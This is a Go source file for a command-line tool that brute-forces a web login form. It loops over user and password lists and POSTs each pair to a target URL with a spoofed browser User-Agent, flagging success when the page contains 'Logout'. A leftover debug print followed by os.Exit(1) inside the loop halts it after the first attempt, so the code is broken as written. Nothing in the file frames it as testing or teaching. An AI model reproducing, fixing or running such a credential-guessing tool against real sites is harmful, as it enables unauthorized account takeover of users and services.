package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
)

func main(){
	var userList string
	var passList string
	var target string
	var answer string
	// Getting users.lst path
	fmt.Print("Please type location of user list\ncyb3rnavy ~$ ")
	fmt.Scan(&userList)

	res, err := ioutil.ReadFile(userList)
	if err != nil {
		log.Fatal(err)
	}
	usersList := strings.Split(string(res), "\n")
	i := 0
	for _, value := range usersList {
		i++
		fmt.Printf("\033[33m[%d] %s\033[0m\n", i, value)
	}
	fmt.Printf("\033[32mFound \033[33m%d\033[0m\033[32m users, is this information correct?\033[0m (\033[32myes/\033[31mno\033[0m)\n", i)
	fmt.Print("cyb3rnavy ~$ ")
	fmt.Scan(&answer)
	if strings.ToLower(answer) != "yes" {
		os.Exit(1)
	}

	// Getting passwords.lst
	fmt.Print("Please type location to password list\ncyb3rnavy~$ ")
	fmt.Scan(&passList)

	res2, err := ioutil.ReadFile(passList)
	if err != nil {
		log.Fatal(err)
	}
	count := strings.Count(string(res2), "\n") + 1
	fmt.Printf("\033[32m[+] Loading %d passwords...\033[0m\n", count)

	// Setting target url
	fmt.Print("Please type the target url to bruteforce...\ncyb3rnavy ~$ ")
	fmt.Scan(&target)

	// Starting attack
	for _, user := range usersList {
		for _, pass := range strings.Split(string(res2), "\n"){
			data := url.Values{}
			data.Set("username", user)
			data.Set("password", pass)
			data.Set("cmdlogin", "Login")
			client := http.Client{}
			fmt.Println(data.Encode())
			os.Exit(1)
			req, err := http.NewRequest("POST", target, strings.NewReader(data.Encode()))
			if err != nil {
				log.Fatal(err)
			}
			req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15")
			resp, err := client.Do(req)
			if err != nil {
				log.Fatal(err)
			}
			defer resp.Body.Close()
			body, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				log.Fatal(err)
			}
			if strings.Contains(string(body), "Logout"){
				fmt.Println("success")
			}
		}
	}
}